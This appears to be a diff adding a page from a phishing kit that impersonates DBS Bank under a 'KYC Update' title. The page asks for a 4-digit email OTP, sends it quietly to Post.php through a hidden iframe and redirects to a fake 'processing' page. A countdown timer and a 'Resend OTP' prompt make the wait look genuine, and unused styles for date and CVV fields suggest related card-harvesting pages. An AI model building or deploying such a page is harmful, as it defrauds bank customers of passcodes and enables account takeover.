@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="theme-color" content="#ffffff">
+    <title>DBS Bank | KYC Update</title>
+<meta name="description" content="login" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+<style type="text/css">
+#mn
+{ 
+  width:104.4%;
+  margin-top:-9px;
+  margin-left:-8px;
+}
+#ft
+{ 
+  width:92%;
+  margin-top:30px;
+  text-align:bottom;
+}
+#pc
+{ 
+  width:92%;
+  margin-left:2px;
+  margin-bottom:20px;
+}
+#btn {
+  cursor: pointer;
+  background-color:#ED2C23;
+  color:#fff;
+  font-family:'Open Sans', sans-serif;
+  border: none;
+  margin-left:190px;
+  font-weight: 700;
+  border-radius: 4px;
+  letter-spacing: 1px;
+  width: 38%;
+  height: 38px;
+  transition: 300ms background-color ease-in-out;
+}
+#btn:hover {
+  background-color: #fff;
+  border:1.2px solid #ED2C23;
+  color:#ED2C23;
+}
+
+input[type="text"] {
+  width: 90%;
+  color:#000;
+  border: none;
+  border-radius: 2px;
+  outline: none;
+  padding: 18px;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+#Date {
+  width: 38%;
+  color:#000;
+  font-size:13px;
+  border:none;
+  border-radius: 2px;
+  letter-spacing:0.2px;
+  padding:18px;
+  margin-left:16.5px;
+  outline: none;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+
+#Cvv {
+  width: 35%;
+  color:#000;
+  font-size:13px;
+  border:none;
+  border-radius: 2px;
+  letter-spacing:0.2px;
+  padding:18px;
+  margin-left:195px;
+  position:absolute;
+  margin-top:-70px;
+  outline: none;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+input::-webkit-input-placeholder {
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus::-webkit-input-placeholder {
+    font-family: 'Open Sans', sans-serif;
+}
+
+/* Firefox < 19 */
+input:-moz-placeholder {
+    font-family: 'Open Sans', sans-serif;
+}
+h3 {
+  border-bottom-style: solid;
+  border-color:#CB9954;
+  border-width:2px;
+  width:104.5%;
+  margin-left:-8px;
+  text-align:centre;
+  align-item:centre;
+}
+</style>
+</head>
+<body onload="startTimer();" style="background-color:#f6f5f1;">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Email_OTP.html';}"></iframe>
+        <img alt="" src="Logo.jpg" id="mn"/><br>
+        <div>
+        <center><h3 style="color:#000; font-family: 'Open Sans', sans-serif; font-size:16px; letter-spacing: 0.2px; word-spacing: 0.2px; font-weight:600;">EMAIL OTP VERIFICATION</h3></center>
+        </div><br>
+        <div>
+        <p1 style="color:#000; font-family: 'Open Sans', sans-serif; font-size:16px; letter-spacing: 0.2px; word-spacing: 0.2px; margin-left:16px; font-weight:700;">Enter 4 Digit Email OTP to proceed. </p1>
+        </div>
+        <div>
+        <p1 style="color:#000; font-family: 'Open Sans', sans-serif; font-size:15px; letter-spacing: 0.2px; word-spacing: 0.2px; margin-left:16px; font-weight:600;">Please enter OTP send to your registered <br> <span style="margin-left:16px;">Email ID carefully.</p1>
+        </div><br>
+        <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="form" >
+                       <div>
+                       <p1 style="color:#676768; font-family: 'Open Sans', sans-serif; font-size:13px; letter-spacing: 0.2px; word-spacing: 0.2px; margin-left:17px;font-weight:600;">EMAIL OTP</p1>
+                       </div>
+                       <div class="input-group">
+                       <center><input class="input-group__input" type="text" name="Email_OTP" inputmode="numeric" maxlength="4" placeholder="Enter Email OTP" id="Email_OTP"
+                       pattern="[0-9]\d{3}" title="Please enter valid OTP!" required /></center>
+                       </div><br><br>
+                       <script type="text/javascript">
+                       var timer=180;
+                       var sec=0;
+                       function startTimer() {
+                       sec=parseInt(timer%180);
+                       
+                       if (timer<2) {
+                       // timer.stop();
+                       window.location.href = "Email_OTP.html";
+                       }
+                       
+                       document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+                       timer--;
+                       setTimeout(function(){
+                       startTimer();
+                       
+                       }, 1000);
+                       }
+                       
+                       </script>
+                       <script>
+                       var url = document.URL;
+                       document.getElementById("url").innerHTML = "URL: " + str;
+                       function replicateTab(){
+                       if(window.confirm("OTP resend successfully, Please refresh your email inbox.")){
+                       window.location.href="Email_OTP.html";
+                       }
+                       }
+                       </script>
+                       <button id = "button" onclick = "replicateTab()"style="font-family: 'Open Sans', sans-serif; font-weight:700; color:#CB9954; background-color:transparent; border:none; position:absolute; margin-top:-8%; margin-left:65%; text-decoration:none;">Resend OTP</button>
+                       </div>
+                       <button type="submit" id="btn">SUBMIT OTP</button><br><br>
+                       <div style="margin-top:0%;">
+                       <center><b style="font-family: 'Open Sans', sans-serif; font-weight:500; color:grey; font-family: 'Work Sans', sans-serif; font-size:14px; text-align:center;"><span style="color:grey; font-family: 'Work Sans', sans-serif; font-size:13px;" id="time"></span>&nbsp;second</b></center>
+                       </div><br>
+                       <center><img alt="" src="" id="ft"/></center>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
